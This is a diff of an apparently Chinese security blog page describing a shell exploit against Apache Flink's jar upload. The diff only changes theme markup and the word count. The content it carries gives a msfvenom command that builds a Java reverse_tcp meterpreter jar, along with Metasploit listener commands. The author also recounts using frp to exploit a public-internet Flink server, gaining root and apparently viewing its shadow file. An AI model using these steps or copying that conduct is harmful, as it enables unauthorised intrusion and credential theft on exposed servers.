@@ -84,7 +84,7 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    2.2k
+                    1.9k
                 </span>
                 
                 
@@ -124,14 +124,14 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <p>Apache Flink下载地址：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</span><br></pre></td></tr></table></div></figure></p>
+            <p>Apache Flink下载地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</span><br></pre></td></tr></table></figure></p>
 <a id="more"></a>
 <p>解压，进入bin目录，运行start-cluster.sh<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/start.png" alt></p>
 <p>访问 <a href="http://ip:8081" target="_blank" rel="noopener">http://ip:8081</a></p>
 <p><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/dashboard.png" alt></p>
-<p>Kali启动<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=4444 -f jar &gt; rce.jar</span><br></pre></td></tr></table></div></figure></p>
+<p>Kali启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=4444 -f jar &gt; rce.jar</span><br></pre></td></tr></table></figure></p>
 <p>生成jar文件木马，上传<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/submit.png" alt></p>
-<p>msf打开监听<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/shell/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br></pre></td></tr></table></div></figure></p>
+<p>msf打开监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/shell/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
 <p>点击控制台里面的submit，看见shell反弹回来啦<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shell.png" alt></p>
 <p>不过msf这里只有内网环境，刚好前两天小伙伴分享了frp内网穿透，就去配置了一下，然后在公网上找到了一个可以利用的点<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/ip.png" alt></p>
 <p>还尼玛是root权限，这个漏洞危害真的高，可惜公网数量太少了<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shadow.png" alt></p>
